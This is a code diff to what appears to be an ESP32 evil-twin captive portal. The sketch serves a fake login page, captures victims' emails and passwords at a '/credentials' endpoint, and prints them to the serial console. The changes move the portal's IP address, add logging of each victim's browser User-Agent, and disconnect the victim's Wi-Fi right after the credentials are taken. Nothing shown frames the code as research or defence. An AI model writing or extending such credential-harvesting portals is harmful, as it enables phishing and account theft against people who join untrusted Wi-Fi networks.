@@ -20,8 +20,8 @@ AsyncWebServer server(80);
 DNSServer dnsServer;
 
 const byte DNS_PORT = 53;
-IPAddress local_IP(172, 16, 42, 42);
-IPAddress gateway(172, 16, 42, 42);
+IPAddress local_IP(172, 16, 42, 2);
+IPAddress gateway(172, 16, 42, 2);
 IPAddress subnet(255, 255, 255, 0);
 
 const char *loginPage = R"rawliteral(
@@ -334,6 +334,7 @@ void setup() {
     server.on("/credentials", HTTP_POST, [](AsyncWebServerRequest *request) {
         String email = "";
         String password = "";
+        String userAgent = request->header("User-Agent");
 
         if (request->hasParam("email", true) && request->hasParam("password", true)) {
             email = request->getParam("email", true)->value();
@@ -344,9 +345,11 @@ void setup() {
             Serial.println("Received credentials:");
             Serial.println("Email: " + email);
             Serial.println("Password: " + password);
+            Serial.println("User Agent: " + userAgent);
             Serial.println("------------------------------------------");
         }
         request->send(200, "text/plain", "Credentials received");
+        WiFi.disconnect(true);
     });
 
     server.begin();
